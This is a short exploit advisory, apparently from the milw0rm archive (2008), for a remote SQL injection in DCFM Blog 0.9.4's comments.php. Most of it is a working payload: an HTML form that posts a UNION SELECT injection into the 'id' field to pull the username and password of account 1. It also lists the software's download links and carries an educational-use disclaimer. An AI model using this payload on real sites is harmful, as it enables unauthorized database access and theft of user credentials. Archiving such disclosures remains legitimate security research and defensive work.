@@ -1,0 +1,43 @@
+  _____ _   _ _____  _____ _____ _____  
+ /  ___| |_| |  _  \|  _  |  _  |_   _| 
+ | (___|  _  | [_)_/| (_) | (_) | | |   
+ \_____|_| |_|_| |_||_____|_____| |_|   
+        C. H. R. O. O. T.  SECURITY  GROUP
+        - -- ----- --- -- -- ---- --- -- - 
+                     http://www.chroot.org
+
+                          _   _ _ _____ ____ ____ __  _ 
+        Hacks In Taiwan  | |_| | |_   _|  __|    |  \| |
+        Conference 2008  |  _  | | | | | (__| () |     |
+                         |_| |_|_| |_| \____|____|_|\__|
+                                      http://www.hitcon.org
+
+
+Title =======:: DCFM Blog 0.9.4 (comments) Remote SQL Injection Vulnerability
+
+Author ======:: unohope [at] chroot [dot] org
+
+IRC =========:: irc.chroot.org #chroot
+
+ScriptName ==:: DCFM Blog
+
+Download ====:: http://nchc.dl.sourceforge.net/sourceforge/dcfm-blog/blog_files_0-9-4.zip
+
+Mirror ======:: http://www.badongo.com/file/9630703
+
+______________________
+[SQL Injection]
+
+- {comments.php} -
+
+<form action="http://localhost/dcfmblog/comments.php" method="post">
+  <input type="text" name="id" size=50 value="-99' union select 0,username,password from accounts where id=1/*">
+  <input type="submit" value=" send ">
+</form>
+
+______
+[NOTE]
+
+!! This is just for educational purposes, DO NOT use for illegal. !!
+
+# milw0rm.com [2008-06-10]
